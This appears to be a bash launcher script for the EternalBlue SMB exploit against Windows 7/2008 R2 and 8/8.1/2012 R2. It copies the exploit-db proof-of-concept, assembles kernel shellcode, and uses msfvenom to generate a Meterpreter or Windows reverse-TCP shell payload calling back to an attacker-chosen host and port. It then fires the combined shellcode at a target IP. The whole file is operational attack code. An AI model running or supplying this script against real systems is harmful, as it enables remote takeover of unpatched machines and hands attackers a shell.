#!/bin/bash --login
usage() {
  echo "USAGE: ${0} <target_ip> <lhost> <lport> <x86|x64> <target_id 0|1>"
  echo "Target ID: 0 => Microsoft Windows Windows 7/2008 R2 (x86/x64)"
  echo "Target ID: 1 => Microsoft Windows Windows 8/8.1/2012 R2 (x86/x64)"
  exit 1
}

if [[ $# != 5 ]]; then
  usage
fi

target="${1}"
lhost="${2}"
lport="${3}"
arch_type="${4}"
target_id="${5}"

eb_root=$(pwd)
x86_asm="${eb_root}/eternalblue_kshellcode_x86"
x64_asm="${eb_root}/eternalblue_kshellcode_x64"
msf_root='/opt/metasploit-framework-dev'
x86_msf="${eb_root}/msf_x86.bin"
x64_msf="${eb_root}/msf_x64.bin"
eb_sc_x86="${eb_root}/eb_sc_x86.bin"
eb_sc_x64="${eb_root}/eb_sc_x64.bin"

if [[ $target_id == 0 ]]; then
  searchsploit_poc=$(locate exploits/windows_x86-64/remote/42031.py)
else
  searchsploit_poc=$(locate exploits/windows_x86-64/remote/42030.py)
fi

eb_poc="${eb_root}/$(basename ${searchsploit_poc})"

# Obtain PoC via exploitdb
cp $searchsploit_poc $eb_root
dos2unix $eb_poc

case $arch_type in
  'x64') nasm -f bin -o $x64_asm $x64_asm.asm 
         cd $msf_root && ./msfvenom -p windows/x64/meterpreter/reverse_tcp -f raw -b "\x00\x0a\x0d\x20" -a x64 -o $x64_msf EXITFUNC=thread LHOST=$lhost LPORT=$lport
         cat $x64_asm $x64_msf > $eb_sc_x64
         echo "Targeting ${target} w/ x64 Payload"
         $eb_poc $target $eb_sc_x64
         echo -e "\n\n\n"
         ;;

  'x86') nasm -f bin -o $x86_asm $x86_asm.asm
         cd $msf_root && ./msfvenom -p windows/shell_reverse_tcp -f raw -b "\x00\x0a\x0d\x20" -a x86 -o $x86_msf EXITFUNC=thread LHOST=$lhost LPORT=$lport
         cat $x86_asm $x86_msf > $eb_sc_x86
         echo "Targeting ${target} w/ x86 Payload"
         $eb_poc $target $eb_sc_x86
         echo -e "\n\n\n"
         ;;

  *) echo -e "ERROR: Invalid architecture type: ${arch_type}\n"
     usage
     ;;
esac
